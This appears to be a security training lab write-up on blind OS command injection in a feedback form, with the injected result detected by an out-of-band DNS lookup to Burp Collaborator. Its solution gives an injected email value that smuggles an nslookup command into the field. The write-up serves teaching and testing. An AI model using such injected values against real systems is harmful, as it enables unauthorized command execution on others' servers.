# Lab 4: Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a `DNS lookup` to `Burp Collaborator`.

#### NOTE: you must use Burp Collaborator's default public server.

## Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
```
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

## Video Solution
[Sommer's YT Video](https://youtu.be/ocqIy3zsZgo)
